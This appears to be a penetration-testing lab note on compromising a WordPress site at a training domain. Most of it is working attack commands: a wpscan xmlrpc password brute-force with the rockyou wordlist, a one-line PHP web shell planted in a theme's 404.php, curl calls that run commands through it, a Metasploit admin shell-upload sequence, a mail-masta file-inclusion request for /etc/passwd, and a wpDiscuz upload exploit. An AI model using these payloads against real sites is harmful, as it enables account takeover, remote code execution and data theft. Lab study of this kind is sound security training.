## Login Bruteforce
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
- Valid credentials = john:firebird1
- Admin access to themes
- Visit /wp-admin/ and login
- Go to Appearance > Theme Editor
- Choose an inactive theme, like twentynineteen
- Edit uncommon page, like 404.php

## Code Execution
```php
system($_GET[0]);
```
- Place this in 404.php
- Click on Update File

```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

**Metasploit
```
use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
show options
exploit
```

**Appendix
- Exploited systems
- Compromised users
- Artifacts created on systems
- Changes


## Leveraging Known Vulnerabilities

Vulnerabilities:
- 4% WordPress core
- 89% plugins
- 7% themes

**Vulnerable Plugins - mail-masta
```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**Vulnerable Plugins - wpDiscuz
https://www.exploit-db.com/exploits/49967
```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

